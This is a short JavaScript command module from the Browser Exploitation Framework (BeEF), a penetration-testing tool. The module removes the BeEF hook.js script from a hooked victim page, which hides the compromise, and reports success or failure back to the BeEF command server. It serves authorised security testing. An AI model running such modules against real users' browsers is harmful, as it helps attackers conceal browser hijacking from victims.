//
// Copyright (c) 2006-2014 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	/**
	 * Removes the BeEF hook.js
	 * @return: true if the hook.js script is removed from the DOM
	 */
	var removeHookElem = function() {
		var removedFrames = $j('script[src*="'+beef.net.hook+'"]').remove();
		if (removedFrames.length > 0) {
			return true;
		} else {
			return false;
		}
	}

	if (removeHookElem() == true) {
		beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=successfully removed the hook script element");
	} else {
		beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=something did not work");
	}

});

